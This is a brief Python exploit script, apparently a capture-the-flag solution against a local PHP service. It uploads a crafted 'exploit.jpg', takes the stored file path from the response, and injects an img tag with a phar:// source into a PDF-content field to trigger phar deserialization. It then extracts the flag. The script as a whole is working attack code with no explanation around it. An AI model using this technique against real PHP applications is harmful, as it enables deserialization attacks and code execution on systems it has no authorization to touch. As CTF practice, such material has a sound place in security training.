import requests
import re
files = {'file': open('exploit.jpg','rb')}
url = 'http://127.0.0.1:4539/index.php'
values = {"filename":"exploit.jpg", "Content-Disposition":"form-data", "Content-Type":"image/jpeg"}
r = requests.post(url, files=files, data=values)
file_link = re.findall(r'src="(.*)"',r.text)[0]
img = '<img src="phar://./%s" width="10" height="10">'
print(re.findall(r'flag{.*}', requests.post(url, data={'pdfcontent': img % file_link}).text)[0])

